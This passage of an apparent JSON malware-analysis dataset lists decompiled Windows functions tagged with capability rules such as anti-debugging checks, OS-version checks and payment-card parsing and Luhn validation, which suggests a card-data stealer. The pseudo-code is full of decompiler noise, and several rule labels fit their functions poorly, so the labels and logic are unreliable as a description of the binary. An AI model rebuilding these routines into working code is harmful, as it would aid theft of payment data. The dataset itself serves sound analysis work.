(*_sym.imp.MSVCRT.dll_sprintf)(puVar6 + -0x314, 0x4111c0, puVar6 + -0x10c, arg_8h_00);\n        iVar4 = fcn.00404080(puVar6 + -0x314);\n        if (iVar4 != 0) {\n            (*pcVar2)(puVar6 + -0x210, 0x4111cc, puVar6 + -0x10c, uVar3);\n            iVar4 = fcn.00404080(puVar6 + -0x210);\n            if (iVar4 != 0) {\n                (*pcVar2)(puVar6 + -0x210, 0x4111cc, puVar6 + -0x10c, *(puVar6 + 0xc));\n                iVar4 = fcn.00404080(puVar6 + -0x210);\n                if (iVar4 != 0) {\n                    iVar4 = 1;\n                    goto code_r0x00404ed5;\n                }\n            }\n        }\n        iVar4 = *(puVar6 + -4);\n        *(puVar6 + -4) = iVar4 + 1;\n    } while (iVar4 + 1 < 3);\n    iVar4 = *(puVar6 + -8);\ncode_r0x00404ed5:\n    fcn.004040d0(*(puVar6 + 0x14), 4);\n    return iVar4 != 0;\n}\n",
        "token_count": 943
    },
    "00401e10": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040205a) overlaps instruction at (ram,0x00402051)\n// \n// WARNING: Removing unreachable block (ram,0x00401eba)\n\nvoid int.00401e10(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint8_t extraout_CL;\n    char extraout_CL_00;\n    char extraout_CH;\n    uint8_t extraout_CH_01;\n    int32_t extraout_ECX;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    uint8_t extraout_CH_00;\n    int32_t extraout_ECX_00;\n    uint8_t extraout_DL;\n    int32_t extraout_EDX;\n    uint32_t unaff_EBX;\n    uint *puVar11;\n    uint *unaff_EBP;\n    int16_t iVar12;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    uint16_t in_SS;\n    uint16_t in_DS;\n    uchar uVar13;\n    uint8_t in_AF;\n    char cVar14;\n    bool bVar15;\n    bool bVar16;\n    char cVar17;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar18;\n    uchar uVar19;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar20;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint32_t uStack72;\n    uint32_t uStack68;\n    uint32_t auStack64 [4];\n    uint32_t uStack48;\n    uint8_t uVar10;\n    \n    iVar12 = unaff_ESI + 1;\n    uVar13 = false;\n    cVar18 = SBORROW2(iVar12, iVar12);\n    cVar17 = '\\0';\n    cVar14 = true;\n    fcn.00402610();\n    if ((!uVar13 && !cVar14) && (uVar13 || cVar14)) {\n        if (!cVar18) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        return;\n    }\n    do {\n        uStack48 = 0x401e6c;\n        fcn.00402610();\n        if ((uVar13) || (!uVar13)) {\n            uStack48 = 0x1a;\n            auStack64[3] = 0x4113d8;\n            goto code_r0x00401e8c;\n        }\n        uVar8 = extraout_ECX - 1;\n    } while (uVar8 != 0 && cVar14 != '\\0');\n    *unaff_EDI = unaff_ESI + 4;\n    unaff_ESI = 0x6ab8ec44;\n    uVar10 = uVar8 >> 8;\n    uVar4 = uVar10 - *(*0x9750e2b5 + -0x28);\n    piVar9 = uVar8 & 0xffff0000 | CONCAT11(uVar4 - uVar13, uVar8);\n    uVar8 = uVar10 < *(*0x9750e2b5 + -0x28) || uVar4 < uVar13;\n    iVar6 = *0x9750e2b5 + *piVar9;\n    cVar18 = SCARRY4(*0x9750e2b5, *piVar9) != SCARRY4(iVar6, uVar8);\n    cVar17 = iVar6 + uVar8 < 0;\ncode_r0x00401e8c:\n    auStack64[2] = 0x15;\n    auStack64[1] = 0x411194;\n    auStack64[0] = 0x401e98;\n    uVar20 = fcn.00402610();\n    uVar8 = uVar20 >> 0x20;\n    piVar9 = unaff_EDI;\n    if (cVar18 == cVar17) {\n        uVar3 = uVar8 << 0x10;\n        auStack64[0] = auStack64[0] & 0xffff | uVar3;\n        if (cVar18 != cVar17) {\n            out(0xc4, uVar20);\n            auStack64[0] = uVar3 | in_DS;\n            uStack72 = uVar8 & 0xffffff00 | uVar20 >> 0x20 ^ extraout_CL;\n            uStack68 = uStack68 & 0xffff0000 | in_SS;\n            piVar9 = unaff_EDI + 1;\n            *unaff_EDI = uVar20;\n        }\n    }\n    uStack76 = 10;\n    uStack80 = 0x41142c;\n    uStack84 = 0x15;\n    uStack88 = 0x411194;\n    fcn.00402610();\n    fcn.00402610();\n    fcn.00402610();\n    cVar17 = SBORROW1(extraout_CL_00, '\\x01');\n    cVar14 = extraout_CL_00 + -1 < '\\0';\n    iVar6 = fcn.00402610();\n    if ((cVar17 != cVar14) || (cVar17 == cVar14)) {\n        uStack48 = 0x411458;\n        auStack64[3] = 0x15;\n    }\n    *(iVar6 + 0x15) = *(iVar6 + 0x15) + extraout_CH;\n    auStack64[2] = 0x411194;\n    auStack64[1] = 0x401f65;\n    fcn.00402610();\n    fcn.00402610();\n    bVar15 = (extraout_DL ^ unaff_EBX >> 8 | 0x67) == 0;\n    fcn.00402610();\n    if ((!bVar15) && (bVar15)) {\n        iVar6 = in(extraout_EDX);\n        *piVar9 = iVar6;\n        piVar9 = piVar9 + 1;\n        if (&stack0xffffffd8 < 1) {\n            return;\n        }\n    }\n    puVar1 = extraout_EDX + 3;\n    bVar15 = false;\n    *puVar1 = *puVar1 ^ extraout_CH_00;\n    bVar16 = *puVar1 == 0;\n    uStack48 = 0x41147c;\n    auStack64[3] = 0x15;\n    auStack64[2] = 0x411194;\n    auStack64[1] = 0x401fe6;\n    fcn.00402610();\n    if (!bVar15 && !bVar16) {\n        unaff_EBX = unaff_EBX & 0xff;\n    }\n    auStack64[1] = 10;\n    auStack64[0] = 0x411480;\n    uStack68 = 0x15;\n    uStack72 = 0x411194;\n    uStack76 = 0x40200b;\n    fcn.00402610();\n    bVar15 = false;\n    fcn.00402610();\n    if ((!bVar15) && (bVar15)) {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    uStack48 = 0x4114cc;\n    auStack64[3] = 0x15;\n    auStack64[2] = 0x411194;\n    auStack64[1] = 0x40206d;\n    uVar7 = fcn.00402610();\n    if ((!bVar15) && (bVar15)) {\n        out(0xbd, uVar7);\n        return;\n    }\n    auStack64[1] = 0xb;\n    auStack64[0] = 0x4114d8;\n    uStack68 = 0x15;\n    uStack72 = 0x411194;\n    uStack76 = 0x40209e;\n    uVar5 = fcn.00402610();\n    uVar13 = 0;\n    uVar5 = (uVar5 & 0xff | ((uVar5 >> 8) - unaff_EBX) + 0x4d << 8) & 0x26ae;\n    uVar19 = SBORROW2(uVar5, 1);\n    cVar14 = uVar5 == 1;\n    while ((fcn.00402610(),  !uVar13 && (uVar13))) {\n        if (extraout_ECX_00 == 1 || cVar14 == '\\0') {\n            *piVar9 = unaff_ESI + 4;\n            cVar17 = 0x97 < *0x9750e2b5;\n            cVar14 = func_0x6a406201();\n            uVar4 = cVar14 + 'h' + cVar17;\n            bVar15 = CARRY1(uVar4, extraout_CH_01);\n            cVar17 = uVar4 + extraout_CH_01;\n            cVar14 = *0xd740000 - cVar17;\n            uVar19 = SBORROW1(*0xd740000, cVar17) != SBORROW1(cVar14, bVar15);\n            *0xd740000 = cVar14 - bVar15;\n            cVar14 = *0xd740000 == '\\0';\ncode_r0x004020fa:\n            if (cVar14) {\n                puVar11 = &stack0xffffffc4;\n                cVar14 = '\\x10';\n                do {\n                    unaff_EBP = unaff_EBP + -1;\n                    puVar11 = puVar11 + -1;\n                    *puVar11 = *unaff_EBP;\n                    cVar14 = cVar14 + -1;\n                } while ('\\0' < cVar14);\n            }\ncode_r0x00402107:\n            auStack64[1] = 0xc;\n            auStack64[0] = 0x4114ec;\n            uStack68 = 0x15;\n            uStack72 = 0x411194;\n            uStack76 = 0x40211a;\n            fcn.00402610();\n            if ((!uVar19) && (uVar19)) {\n                LOCK();\n            }\n            uStack76 = 4;\n            uStack80 = 0x4114f8;\n            uStack84 = 0x15;\n            uStack88 = 0x411194;\n            fcn.00402610();\n            if ((!SCARRY4(&stack0xffffffa8, 0x40)) && (SCARRY4(&stack0xffffffa8, 0x40))) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar4 = fcn.00402610();\n            cVar14 = uVar4 - *piVar9;\n            uStack48 = (in_NT & 1) * 0x4000 | SBORROW1(uVar4, *piVar9) * 0x800 | (in_IF & 1) * 0x200 |\n                       (in_TF & 1) * 0x100 | (cVar14 < '\\0') * 0x80 | (cVar14 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                       ((POPCOUNT(cVar14) & 1U) == 0) * 4 | uVar4 < *piVar9 | (in_ID & 1) * 0x200000 |\n                       (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n            auStack64[3] = 0x402190;\n            func_0x10188108();\n            auStack64[3] = 0x411508;\n            auStack64[2] = 0x15;\n            auStack64[1] = 0x411194;\n            auStack64[0] = 0x4021a9;\n            fcn.00402610();\n            uStack48 = 0x4021da;\n            fcn.00402610();\n            return;\n        }\n    }\n    uStack48 = 0x4114e8;\n    auStack64[3] = 0x15;\n    auStack64[2] = 0x411194;\n    auStack64[1] = 0x4020f8;\n    fcn.00402610();\n    if (!cVar14) goto code_r0x004020fa;\n    goto code_r0x00402107;\n}\n",
        "token_count": 2952
    },
    "00402560": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00402560(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 186
    },
    "00402840": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040291b) overlaps instruction at (ram,0x00402912)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00402840(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EDX;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint32_t unaff_EBX;\n    uchar *puVar6;\n    int32_t iVar7;\n    uchar *unaff_EDI;\n    int32_t iVar8;\n    bool bVar9;\n    uint var_1h;\n    \n    iVar7 = 0;\n    if (0 < arg_14h) {\n        puVar6 = &var_1h + 1;\n        iVar3 = 1;\n        do {\n            while( true ) {\n                iVar8 = *(puVar6 + 0x10);\n                uVar5 = *(iVar7 + iVar8);\n                unaff_EBX = unaff_EBX & 0xffffff00;\n                bVar9 = ((CONCAT11((iVar8 >> 8) + -0x2b, iVar8) ^ 0x3d) + 0x7c28 ^\n                        CONCAT11(in_EDX >> 8 | in_EDX, in_EDX)) < 0x4001;\n                iVar8 = *(puVar6 + 0xc);\n                puVar1 = *(puVar6 + 8);\n                uVar2 = *(iVar3 % iVar8 + puVar1);\n                in_EDX = iVar3 % iVar8 & 0xffffff00U | uVar2;\n                puVar6[-1] = uVar2;\n                if ((bVar9) || (!bVar9)) break;\n                unaff_EDI = 0xb7f8c08b;\n                if (&stack0xffffffec < *puVar1 || puVar1 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            uVar4 = (iVar3 + -1) % iVar8;\n            uVar5 = uVar5 ^ *(uVar4 + *(puVar6 + 8));\n            bVar9 = (POPCOUNT(uVar4 + (uVar4 >> 8)) & 1U) == 0;\n            if ((bVar9) || (!bVar9)) {\n                uVar4 = *(puVar6 + 0x14);\n                iVar8 = *(puVar6 + 0x18);\n            }\n            puVar1 = (unaff_EBX | uVar5) + 0x7d8b1455;\n            *puVar1 = *puVar1 | 0x18;\n            uVar2 = uVar4 * '\\x02';\n            uVar5 = uVar2 ^ uVar5;\n            in_EDX = uVar4 & 0xffffff00 | uVar5;\n            *(iVar8 + -1 + iVar3) = uVar5;\n            uVar5 = puVar6[-1];\n            unaff_EBX = unaff_EBX | uVar5;\n            *(iVar7 + 0x43d1773a) = *(iVar7 + 0x43d1773a) ^ 0x8a27e95e;\n            *(unaff_EBX + 0xc33202c1) = *(unaff_EBX + 0xc33202c1) + 1;\n            iVar7 = iVar7 + 1;\n            *(iVar3 + iVar8) = (uVar2 ^ uVar5) + 0xe;\n            puVar6 = unaff_EDI;\n            iVar3 = iVar3 + 2;\n        } while (iVar7 < *(unaff_EDI + 0x14));\n    }\n    return;\n}\n",
        "token_count": 894
    },
    "004026c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402722) overlaps instruction at (ram,0x0040271f)\n// \n\nvoid __cdecl fcn.004026c0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t extraout_DL;\n    uint unaff_EBX;\n    bool bVar1;\n    \n    if (arg_ch == 1) {\n        fcn.00401880();\n        fcn.004011d0();\n        bVar1 = (extraout_DL ^ unaff_EBX >> 8 | 0x67) == 0;\n        fcn.00403760();\n        if ((bVar1) || (!bVar1)) {\n            if (*0x42365c != 0) goto code_r0x00402738;\n            (*_sym.imp.USER32.dll_PostQuitMessage)();\n        }\n        fcn.00404b10();\n    }\ncode_r0x00402738:\n    (*_sym.imp.USER32.dll_DefWindowProcA)();\n    return;\n}\n",
        "token_count": 234
    },
    "00403040": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403040(uint s1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(s1);\n    var_14h = 0x4115dc;\n    var_10h = 0x4115d4;\n    var_ch = 0x4115e4;\n    var_8h = 0x4115ec;\n    var_4h = 0x4115f4;\n    uVar3 = 0;\n    puVar2 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, *puVar2);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, 0x4115cc);\n    return iVar1 == 0;\n}\n",
        "token_count": 287
    },
    "00403b80": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403b80(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    char **ppcVar7;\n    uint *puVar8;\n    char *pcVar9;\n    bool bVar10;\n    char *pcStack632;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    puVar6 = &stack0xfffffffc;\n    var_264h = 0;\n    puVar8 = &var_263h;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    var_160h = '\\0';\n    puVar8 = &var_15fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    pcStack632 = arg_8h;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x411228);\n    pcStack632 = arg_8h;\n    (*pcVar2)(&var_264h, 0x411240);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar5 = 0xffffffff;\n    pcVar9 = &var_160h;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar9 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar5 - 1;\n    uVar5 = 0xffffffff;\n    pcVar9 = arg_8h;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar9 + 1;\n    } while (cVar1 != '\\0');\n    bVar10 = (POPCOUNT(~uVar5 - 1 & 0xff) & 1U) != 0;\n    var_34h = 0x411268;\n    var_30h = 0x411274;\n    var_2ch = 0x411280;\n    var_28h = 0x411290;\n    var_24h = 0x411298;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar5 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((bVar10) && (!bVar10)) {\n        ppcVar7 = &pcStack632;\n        cVar1 = '\\x1e';\n        do {\n            puVar6 = puVar6 + -1;\n            ppcVar7 = ppcVar7 + -1;\n            *ppcVar7 = *puVar6;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar3 = in(0x78);\n        return uVar3;\n    }\n    if ((arg_ch != 0) < 5) {\n        uVar5 = (arg_ch != 0) * 4;\n        do {\n            pcStack632 = *(&var_48h + uVar5);\n            iVar4 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar5), *(&var_5ch + uVar5), *(&var_20h + uVar5));\n            if (iVar4 != 0) {\n                return 0;\n            }\n            uVar5 = uVar5 + 4;\n        } while (uVar5 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1291
    },
    "00404140": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00404140(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00402560(0x80000002, 0x411374, 0x4113c0, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "004048f0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.004048f0(void)\n\n{\n    uint uVar1;\n    char extraout_CL;\n    int32_t unaff_EBX;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    bVar2 = &stack0xfffffffc < 0x94;\n    bVar4 = SBORROW4(&stack0xfffffffc, 0x94);\n    bVar3 = *0x10 == 0x98;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (!bVar2 && !bVar3) {\n        if (bVar2 || bVar3) {\n            if (!bVar4) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(unaff_EBX + 0x5e5ffc45) = *(unaff_EBX + 0x5e5ffc45) + extraout_CL;\n            return uVar1;\n        }\n    }\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 325
    },
    "00402940": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402940(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00403af0(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 121
    },
    "004040d0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004040d0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00402b10": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402b31) overlaps instruction at (ram,0x00402b30)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00402c08)\n// WARNING: Heritage AFTER dead removal. Example location: s0x00000014 : 0x00402c40\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall\nfcn.00402b10(uint param_1, int32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n            uint32_t param_8)\n\n{\n    char **ppcVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t iVar4;\n    uint32_t extraout_ECX_01;\n    uint extraout_EDX;\n    uint uVar5;\n    char *unaff_EBX;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    char **ppcVar10;\n    uint *puVar11;\n    uint16_t in_SS;\n    bool bVar12;\n    uint8_t in_AF;\n    bool bVar13;\n    char cVar14;\n    bool bVar15;\n    char cVar16;\n    uint64_t uVar17;\n    uint uStackY88;\n    uint32_t uStackY84;\n    uchar uStack40;\n    char *apcStack39 [7];\n    uint uStack8;\n    \n    bVar12 = &stack0xfffffffc < 0x24;\n    if ((!bVar12) && (bVar12)) {\n        unaff_EBX = unaff_EBX + bVar12 + *(unaff_EBX + param_2 * 4 + 0x69);\n    }\n    do {\n        uVar17 = fcn.00402e70(param_7, param_8, 0x4111f0, 7);\n        uStack8 = uVar17;\n        bVar12 = uStack8 == NULL;\n        if (bVar12) {\n            return 0;\n        }\n        if (bVar12) {\ncode_r0x00402b88:\n            uVar17 = uVar17 & 0xffffffff00000000;\n            uStack40 = 0;\n            ppcVar10 = &stack0xffffffd9;\n            for (uVar3 = 7; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *ppcVar10 = NULL;\n                ppcVar10 = ppcVar10 + 1;\n            }\n        }\n        else {\n            uVar3 = (extraout_ECX >> 8 & 0xffff00) << 8 | extraout_ECX & 0xffff;\n            if (!bVar12) goto code_r0x00402b88;\n            puVar9 = extraout_ECX << 0x10 | in_SS;\n            cVar14 = uVar17 >> 0x28;\n            *unaff_EBX = *unaff_EBX + cVar14;\n            ppcVar10 = puVar9 + 1;\n            *puVar9 = 0;\n            unaff_EBX = unaff_EBX & 0xffffff00 | unaff_EBX + cVar14;\n        }\n        while( true ) {\n            ppcVar1 = _sym.imp.MSVCRT.dll_rand;\n            *ppcVar10 = uVar17;\n            *(ppcVar10 + 2) = uVar17;\n            bVar15 = false;\n            bVar13 = false;\n            bVar12 = true;\n            uVar7 = 0;\n            while ((bVar12 || bVar15 != bVar13 || (!bVar12 && bVar15 == bVar13))) {\n                uVar17 = (*ppcVar1)();\n                uVar3 = uVar17 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                uVar17 = uVar17 & 0xffffffff00000000 | uVar3;\n                (&stack0xffffffd8)[uVar7] = uVar3;\n                uVar8 = uVar7 + 1;\n                bVar15 = SBORROW4(uVar8, 0x20);\n                bVar13 = uVar7 - 0x1f < 0;\n                bVar12 = uVar8 == 0x20;\n                uVar3 = extraout_ECX_00;\n                uVar7 = uVar8;\n                if (0x1f < uVar8) {\n                    cVar16 = '\\0';\n                    cVar14 = '\\0';\n                    puVar9 = &stack0xffffffd8;\n                    puVar11 = uStack8;\n                    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar11 = *puVar9;\n                        puVar9 = puVar9 + 1;\n                        puVar11 = puVar11 + 1;\n                    }\n                    uStackY84 = 0x402c28;\n                    fcn.00404190(param_3, param_4, param_5, param_6, &stack0xffffffd8, 0x20, uStack8);\n                    if ((cVar16 != cVar14) ||\n                       (uStackY84 = uStackY84 & 0xffff | extraout_ECX_01 << 0x10,  uVar3 = extraout_ECX_01, \n                       uVar5 = extraout_EDX,  cVar16 == cVar14)) {\n                        uStackY84 = param_8;\n                        uStackY88 = param_7;\n                        uVar3 = param_8;\n                        uVar5 = param_7;\n                    }\n                    puVar6 = &stack0xffffffa8 ^ *(unaff_EBX + -0x75);\n                    puVar6[-1] = &stack0xfffffffb;\n                    *(uVar3 + 0x52) = (*(uVar3 + 0x52) - uVar5) - (puVar9 < 0x8b);\n                    puVar6[-2] = 0x402c4a;\n                    fcn.00404d20(puVar6[-1], *puVar6);\n                    return 1;\n                }\n            }\n            in_AF = 9 < (uVar17 & 0xf) | in_AF;\n            pcVar2 = uVar17 & 0xffff0000 | CONCAT11((uVar17 >> 8) + in_AF, uVar17 + in_AF * '\\x06') & 0xff0f;\n            if (uVar3 != 0) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            *ppcVar1 = *ppcVar1;\n            *(pcVar2 * 2) = *(pcVar2 * 2);\n            *unaff_EBX = *unaff_EBX + (uVar17 >> 0x20);\n            uVar17 = CONCAT44(*(pcVar2 + 0x3b) * -0x6a147e22, unaff_EBX);\n            uVar3 = 0xffffffff;\n            if (*unaff_EBX == '\\0') break;\n            ppcVar10 = ppcVar1 + 1;\n            *ppcVar1 = unaff_EBX;\n            unaff_EBX = pcVar2;\n        }\n        *unaff_EBX = *unaff_EBX + unaff_EBX;\n        unaff_EBX = pcVar2;\n    } while( true );\n}\n",
        "token_count": 1737
    },
    "00402f30": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.00402f30(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x4115fc, 0x411624, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 318
    },
    "00404020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
